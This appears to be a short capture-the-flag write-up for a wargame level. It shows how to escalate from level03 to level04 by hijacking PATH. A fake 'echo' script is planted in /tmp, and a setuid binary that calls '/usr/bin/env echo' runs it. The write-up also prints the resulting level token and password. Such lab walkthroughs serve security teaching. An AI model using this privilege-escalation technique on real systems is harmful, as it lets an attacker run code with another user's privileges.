## Check files inside home folder of user level03
ls -la

-> -rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03

## This file can be execute as flag03 user
./level03

-> Exploit me

## To exploit this file we check all strings inside this
strings level03

-> /usr/bin/env echo Exploit me

## Create in tmp folder a fake echo script and grant all permissions
echo '/bin/getflag' > echo
chmod 777 echo

## Add /tmp routh in variable env $PATH
export PATH=/tmp:$PATH

## Execute level03 script to get the password of level04
./level03

->Check flag.Here is your token : qi0maab88jeaj46qoumi7maus

su level04 (password: qi0maab88jeaj46qoumi7maus)